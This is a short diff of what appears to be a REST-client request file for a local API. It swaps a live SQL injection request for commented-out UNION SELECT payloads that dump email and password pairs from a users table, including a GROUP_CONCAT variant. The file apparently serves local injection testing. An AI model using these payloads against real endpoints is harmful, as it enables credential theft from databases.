@@ -1,6 +1,9 @@
 GET http://localhost:3001/api/posts
 
 ###
-GET http://localhost:3001/api/posts/1 UNION SELECT email,password,3,4,5,6,7 FROM users
 
-# GET http://localhost:3001/api/posts/1
+GET http://localhost:3001/api/posts/1
+
+# GET http://localhost:3001/api/posts/0 UNION SELECT email,password,3,4,5,6,7,8,9,10 FROM users; -- -
+
+# GET http://localhost:3001/api/posts/0 UNION SELECT GROUP_CONCAT(email, ':', password SEPARATOR ' || '), '2','3','4','5','6','7','8','9','10' FROM users; -- -
